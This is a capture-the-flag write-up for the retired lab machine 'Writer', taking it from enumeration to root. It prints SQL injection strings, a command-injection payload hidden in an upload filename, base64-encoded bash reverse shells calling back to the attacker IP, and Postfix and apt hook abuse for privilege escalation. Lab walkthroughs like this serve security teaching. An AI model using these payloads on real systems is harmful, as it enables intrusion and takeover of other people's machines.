# Writer

This is the write-up for the box Writer that got retired at the 11th December 2021.
My IP address was 10.10.14.5 while I did this.

Let's put this in our hosts file:
```markdown
10.10.11.101    writer.htb
```

## Enumeration

Starting with a Nmap scan:

```
nmap -sC -sV -o nmap/writer.nmap 10.10.11.101
```

```
PORT    STATE SERVICE     VERSION
22/tcp  open  ssh         OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072 9820b9d0521f4e103a4a937e50bcb87d (RSA)
|   256 1004797a2974db28f9ffaf68dff13f34 (ECDSA)
|_  256 77c4869a9f334fda71202ce151107e8d (ED25519)
80/tcp  open  http        Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Story Bank | Writer.HTB
139/tcp open  netbios-ssn Samba smbd 4.6.2
445/tcp open  netbios-ssn Samba smbd 4.6.2
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

## Checking HTTP (Port 80)

The web server hosts a custom developed website with different articles.

Lets search for hidden directories with **Gobuster**:
```
gobuster -u http://10.10.11.101/ dir -w /usr/share/seclists/Discovery/Web-Content/raft-small-words-lowercase.txt
```

It finds the directory _/administrative_ which forwards to an _Admin Login panel_.
After testing basic **SQL Injections**, it is possible to login as the _admin_ user:
```
Username: admin'-- -
Password: admin'-- -
```

It forwards to _/dashboard_ and gives us the ability to add stories, which includes the upload of images.
This feature could be used to upload arbitrary code, if we can find out in which language the backend is created.

Using **Union SQL Injection** to find the injection point:
```
POST /administrative
(...)

uname=admin' union select 1,2,3,4,5,6-- -&password=admin'-- -
```
```
Welcome admin2
```

Using _LOAD_FILE_ to read local files on the box:
```
uname=admin' union select 1,LOAD_FILE("/etc/passwd"),3,4,5,6-- -&password=admin'-- -
```

To find names of files on the server, the **Local File Inclusion** list in [this GitHub repository](https://github.com/MrW0l05zyn/pentesting/blob/master/web/payloads/lfi-rfi/lfi-linux-list.txt) can be used.
With the Python script [writer_sqli.py](writer_sqli.py) in this repository, the list can be used to search for valid filenames:
```
for i in $(cat lfi-linux-list.txt); do python3 writer_sqli.py $i; done
```

After a while, it will save all found files into our _files_ directory.
The file _/etc/apache2/sites-enabled/000-default.conf_ exposes a file of the web service called _/var/www/writer.htb/writer.wsgi_.
```
python3 writer_sqli.py /var/www/writer.htb/writer.wsgi
```
```
(...)
# Import the __init__.py from the app folder
from writer import app as application
```

It imports _init.py_ from the directory, which may have some more interesting code:
```
python3 writer_sqli.py /var/www/writer.htb/writer/__init__.py
```

Now we know that this web application is developed with **Python Flask** and there are hardcoded credentials in this file:
```
connector = mysql.connector.connect(user='admin', password='ToughPasswordToCrack', host='127.0.0.1', database='writer')
```

On line 111, it accepts user input in _os.system_, which is a vulnerability that can be abused to execute arbitrary commands:
```python
os.system("mv {} {}.jpg".format(local_filename, local_filename))
```

Base64-encoding reverse shell command:
```
echo 'bash -i  >& /dev/tcp/10.10.14.5/9001  0>&1  ' | base64
```

The request to the image upload should be intercepted with a proxy like **Burpsuite** to modify it.

Creating filename with reverse shell command:
```
POST /dashboard/stories/add HTTP/1.1
(...)

Content-Disposition: form-data; name="image"; filename="DoesNotMatter.jpg;echo -n YmFzaCAtaSAgPiYgL2Rldi90Y3AvMTAuMTAuMTQuNS85MDAxICAwPiYxICAK | base64 -d | bash;"
Content-Type: image/jpeg
(...)
```

Calling the file:
```
POST /dashboard/stories/add HTTP/1.1
(...)

Content-Disposition: form-data; name="image_url"

file:///var/www/writer.htb/writer/static/img/DoesNotMatter.jpg;echo -n YmFzaCAtaSAgPiYgL2Rldi90Y3AvMTAuMTAuMTQuNS85MDAxICAwPiYxICAK | base64 -d | bash;
```

After the request, the filename will be injected as a command and the listener on my IP and port 9001 starts a shell as _www-data_.

## Privilege Escalation

In the web directory is another directory _/var/www/writer2_project_ with source code files.
The file _writerv2/settings.py_ has more information about this web application:
```
ALLOWED_HOSTS = ['127.0.0.1']
(...)
DATABASES = {
    'default': {
        'ENGINE': 'django.db.backends.mysql',
        'OPTIONS': {
            'read_default_file': '/etc/mysql/my.cnf',
```

It only allows localhost to access it and the database can be found in _/etc/mysql/my.cnf_.
This file contains credentials for a different database:
```
database = dev
user = djangouser
password = DjangoSuperPassword
```

Enumerating the **MySQL database**:
```
mysql -u djangouser -p dev
```
```
MariaDB [dev]> show tables;
MariaDB [dev]> select * from auth_user;

+----------+------------------------------------------------------------------------------------------+
| username | password                                                                                 |
+----------+------------------------------------------------------------------------------------------+
| kyle     | pbkdf2_sha256$260000$wJO3ztk0fOlcbssnS1wJPD$bbTyCB8dYWMGYlz4dSArozTY7wcZCS7DV6l5dpuXM4A= |
+----------+------------------------------------------------------------------------------------------+
```

Trying to crack the hash with **Hashcat**:
```
hashcat kyle.hash /usr/share/wordlists/rockyou.txt
```
```
marcoantonio
```

After a while the hash gets cracked and the password can be used to login as _kyle_:
```
ssh kyle@10.10.11.101
```

### Privilege Escalation 2

The user _kyle_ is a member of the groups _filter_ and _smbgroup_.

Finding files that are owned by the group _filter_:
```
find / -group filter -ls 2>/dev/null
```
```
-rwxrwxr-x   1 root     filter       1021 Dec 21 16:44 /etc/postfix/disclaimer
drwxr-x---   2 filter   filter       4096 May 13  2021 /var/spool/filter
```

The file _disclaimer_ is a bash script and it is configured in the **Postfix** configuration file _/etc/postfix/master.cf_:
```
flags=Rq user=john argv=/etc/postfix/disclaimer -f ${sender} -- ${recipient}
```

It gets executed by the user _john_ when sending an email, so we can modify it to include a reverse shell command:
```
bash -c 'bash -i >& /dev/tcp/10.10.14.5/9002 0>&1'
(...)
```

Sending an email with `nc`:
```
nc localhost 25

EHLO writer.htb
(...)
MAIL FROM: kyle@writer.htb
RCPT TO: root@writer.htb
DATA

Subject: Test mail
Test
.
```

After sending the mail, the modified _disclaimer_ script will be executed and the listener on my IP and port 9002 starts a shell as _john_.
The private SSH key in the home directory _/home/john/.ssh_ can be stolen and used to create a real SSH session.
```
ssh -i john.key john@10.10.11.101
```

### Privilege Escalation to root

The user _john_ is a member of the group _management_.

Finding files that are owned by the group _management_:
```
find / -group filter -ls 2>/dev/null
```
```
drwxrwxr-x   2 root     management     4096 Jul 28  2021 /etc/apt/apt.conf.d
```

The directory _/etc/apt/apt.conf.d/_ contains configuration files for the **apt** package manager.

By creating a new configuration file in the directory, the _Pre-Invoke_ feature can be used to execute commands:
```
APT::Update::Pre-Invoke { "echo -n YmFzaCAtaSAgPiYgL2Rldi90Y3AvMTAuMTAuMTQuNS85MDAxICAwPiYxICAK | base64 -d | bash;" }
```

After a while the new configuration file will be processed and execute the Base64-encoded reverse shell command that starts a session on my IP and port 9001 as root!
